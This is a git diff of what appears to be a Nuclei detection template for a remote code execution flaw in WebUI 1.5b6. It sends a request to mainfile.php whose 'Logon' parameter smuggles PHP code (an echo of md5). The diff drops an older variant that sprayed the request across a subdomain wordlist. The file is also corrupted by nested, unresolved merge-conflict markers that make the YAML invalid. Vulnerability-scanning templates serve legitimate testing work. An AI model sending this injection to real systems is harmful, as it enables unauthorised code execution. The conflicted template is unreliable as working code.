@@ -5,9 +5,12 @@ info:
   author: pikpikcu
   severity: critical
 <<<<<<< HEAD
+<<<<<<< HEAD
   reference: https://www.exploit-db.com/exploits/36821
   tags: webui,rce
 =======
+=======
+>>>>>>> 18ddf72b (add new stuff)
   description: WebUI 1.5b6 is vulnerable to remote code execution because the 'mainfile.php' endpoint allows remote attackersto execute arbitrary code via the 'Logon' parameter.
   reference:
     - https://www.exploit-db.com/exploits/36821
@@ -16,21 +19,16 @@ info:
     cvss-score: 10.0
     cwe-id: CWE-77
   tags: webui,rce,edb
+<<<<<<< HEAD
 >>>>>>> 5d36d276 (add new stuff)
+=======
+>>>>>>> 18ddf72b (add new stuff)
 
 requests:
-  - payloads:
-      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-    attack: sniper
-    threads: 100
+  - method: GET
+    path:
+      - '{{BaseURL}}/mainfile.php?username=test&password=testpoc&_login=1&Logon=%27%3Becho%20md5(TestPoc)%3B%27'
 
-    raw:
-      - |
-        GET /mainfile.php?username=test&password=testpoc&_login=1&Logon=%27%3Becho%20md5(TestPoc)%3B%27 HTTP/1.1
-        Host: {{Subdomains}}
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
-        Accept-Encoding: gzip, deflate
-        Accept: */*
     matchers-condition: and
     matchers:
       - type: word
